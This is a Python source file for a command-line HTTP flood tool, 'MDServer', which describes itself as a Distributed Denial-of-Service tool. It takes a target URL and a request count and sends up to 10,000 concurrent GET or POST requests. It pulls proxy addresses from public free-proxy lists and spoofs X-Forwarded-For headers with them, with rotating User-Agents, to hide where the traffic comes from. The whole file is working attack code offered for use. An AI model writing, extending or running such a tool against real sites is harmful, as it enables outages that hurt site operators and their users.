
import asyncio
import aiohttp
import random
import re
import itertools
import argparse
from colorama import init, Style

# Initialize colorama
init(autoreset=True)

# ANSI 256-color values from orange to pink
colors = [208, 209, 210, 211, 212, 213]

# ASCII Art Banner (VYT)
banner_lines = [
    r" ___      ___ ___    ___ _________  ________  ________  ___          ",
    r"|\  \    /  /|\  \  /  /|\___   ___|\   __  \|\   __  \|\  \         ",
    r"\ \  \  /  / \\ \  \/  / \|___ \  \_\ \  \\  \ \  \\  \ \  \        ",
    r" \ \  \/  / / \ \    / /     \ \  \ \ \  \\\  \ \  \\\  \ \  \       ",
    r"  \ \    / /   \/  /  /       \ \  \ \ \  \\\  \ \  \\\  \ \  \____  ",
    r"   \ \__/ /  __/  / /          \ \__\ \ \_______\ \_______\ \_______\\",
    r"    \|__|/  |\___/ /            \|__|  \|_______|\|_______|\|_______|",
    r"            \|___|/                                                  "
]

# Print the banner with color gradient
for i, line in enumerate(banner_lines):
    color_code = f'\033[38;5;{colors[i % len(colors)]}m'
    print(f"{color_code}{line}{Style.RESET_ALL}")

# Argument parser setup
def parse_args():
    parser = argparse.ArgumentParser(description="MDServer is Distributed Denial-of-Service tool")
    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL for the DDoS attack.")
    parser.add_argument('-r', '--requests', type=int, required=True, help="Number of requests to send.")
    parser.add_argument('-m', '--method', type=str, choices=['GET', 'POST'], required=False, help="HTTP method to use.")
    parser.add_argument('--fast', action='store_true', help="Use fast mode with more parallel requests.")
    parser.add_argument('--slow', action='store_true', help="Use slow mode with fewer parallel requests.")
    parser.add_argument('--proxy', type=str, help="Use one specific proxy to send requests from.")
    parser.add_argument('-refer', '--refer', type=str, help="Custom Referer to send in the request.")
    return parser.parse_args()

# Proxy source list
ip_list_urls = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
]

# User-Agent pool
UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)"
]

# Async proxy fetcher
async def fetch_ip_addresses(url):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as response:
                text = await response.text()
                ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                return ip_addresses
        except Exception:
            return []

# Combine all proxies
async def get_all_ips():
    tasks = [fetch_ip_addresses(url) for url in ip_list_urls]
    ip_lists = await asyncio.gather(*tasks)
    all_ips = [ip for sublist in ip_lists for ip in sublist]
    print(f"Total Proxies fetched: {len(all_ips)}")
    return all_ips

# Send HTTP request
async def send_request(session, proxy, method, url, semaphore, referer=None):
    headers = {
        "User-Agent": random.choice(UserAgents),
        "X-Forwarded-For": proxy,
    }
    if referer:
        headers["Referer"] = referer
    try:
        async with semaphore:
            if method == 'GET':
                async with session.get(url, headers=headers) as response:
                    print(f"[MDServer] GET {url} from {proxy} - Status: {response.status}")
            elif method == 'POST':
                async with session.post(url, headers=headers) as response:
                    print(f"[MDServer] POST {url} from {proxy} - Status: {response.status}")
    except Exception as e:
        print(f"Request error from {proxy}: {e}")

# Main logic
async def main():
    args = parse_args()
    semaphore = asyncio.Semaphore(10000 if args.fast else 100 if args.slow else 500)

    if args.proxy:
        ip_list = [args.proxy]
    else:
        ip_list = await get_all_ips()

    ip_cycle = itertools.cycle(ip_list)
    tasks = []

    async with aiohttp.ClientSession() as session:
        for _ in range(args.requests):
            tasks.append(send_request(session, next(ip_cycle), args.method or "GET", args.url, semaphore, args.refer))
        await asyncio.gather(*tasks)

# Entry point
if __name__ == "__main__":
    asyncio.run(main())
